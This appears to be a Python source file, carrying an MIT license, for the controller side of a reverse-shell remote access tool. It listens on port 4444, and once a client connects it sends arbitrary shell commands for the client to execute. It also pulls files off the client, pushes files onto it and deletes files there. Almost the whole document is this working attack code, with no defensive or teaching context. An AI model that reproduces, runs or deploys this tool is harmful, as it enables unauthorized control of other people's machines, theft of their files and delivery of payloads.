"""
MIT License

© 2024 [Mahmoud Al-Sharif]

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

import socket

def receive_file(client_socket):
    filename = client_socket.recv(1024).decode()
    with open(filename, 'wb') as f:
        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            f.write(data)
    print(f"File {filename} received successfully.")

def show_help():
    print("""
Available Commands:
1. Command Execution: Type any shell command directly to execute it on the client.
2. cd <directory>: Change directory on the client.
3. dir: List files in the current directory on the client.
4. get <file_path>: Download a file from the client to the server.
5. put <file_path>: Upload a file from the server to the client.
6. remove <file_path>: Delete a file on the client.
7. Exit: Type 'exit' to close the connection and stop the server.
    """)

# إعداد الخادم
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind(('0.0.0.0', 4444))
server_socket.listen(1)

print("Waiting for connection...")

client_socket, client_address = server_socket.accept()
print(f"Connection from {client_address}")

show_help()

while True:
    command = input("Enter command: ")
    if command.lower() == 'exit':
        client_socket.send(b'exit')
        break
    elif command.lower().startswith('get'):
        client_socket.send(command.encode())
        receive_file(client_socket)
    elif command.lower().startswith('put'):
        _, filepath = command.split(' ', 1)
        client_socket.send(command.encode())
        with open(filepath, 'rb') as f:
            while (chunk := f.read(1024)):
                client_socket.send(chunk)
        client_socket.send(b'DONE')
    elif command.lower() == 'help':
        show_help()
    else:
        client_socket.send(command.encode())
        response = client_socket.recv(1024).decode()
        print(response)

client_socket.close()
server_socket.close()
